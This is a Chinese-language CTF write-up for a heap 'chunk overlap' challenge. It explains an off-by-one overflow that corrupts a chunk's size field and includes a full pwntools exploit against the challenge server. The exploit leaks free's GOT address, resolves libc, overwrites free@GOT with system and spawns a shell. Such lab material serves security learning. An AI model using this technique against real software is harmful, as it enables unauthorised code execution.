# 挑战简介
堆块重叠

# 思路
堆块重叠是通过修改堆块的元数据（特别是size字段）来实现的，让分配器认为两个不同的堆块占用了相同的内存区域。  

```
read_input((void *)heaparray[(signed int)v1][1], *heaparray[(signed int)v1] + 1LL);
```

如上，edit的时候，可以溢出一个字节，因此可以在chunk1区域修改chunk2区域的size大小  

由于chunk2被标记为0x41大小释放，但重新申请0x30时，分配器会给出一个覆盖原chunk2位置但更大的区域。  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')
context(arch = "i386",os = 'linux',log_level = 'debug')
#io = process("./pwn")  
io = remote('pwn.challenge.ctf.show', 28204)
elf = ELF('D:\edge 下载\pwn')

def create(size,content):
    io.sendlineafter(b'choice :',b'1')
    io.sendlineafter(b':',str(size).encode())
    io.sendafter(b':',content)

def edit(index,content):
    io.sendlineafter(b'choice :',b'2')
    io.sendlineafter(b':',str(index).encode())
    io.sendafter(b':',content)

def show(index):
    io.sendlineafter(b'choice :',b'3')
    io.sendlineafter(b':',str(index).encode())

def delete(index):
    io.sendlineafter(b'choice :',b'4')
    io.sendlineafter(b':',str(index).encode())

create(0x18,"aaaa")
create(0x10,"bbbb")
edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
delete(1)
create(0x30, p64(0) * 4 + p64(0x30) + p64(elf.got['free']))
show(1)
io.recvuntil(b'Content : ')
data = io.recvuntil("Done !")

free = u64(data[:6].ljust(8,b'\x00'))
libc = LibcSearcher('free',free)
libc_base = free - libc.dump('free')
system = libc_base + libc.dump('system')
log.success('free: ' + hex(free))
log.success('libc_base: ' + hex(libc_base))
log.success('system: ' + hex(system))
edit(1, p64(system))
delete(0)
io.interactive()
```
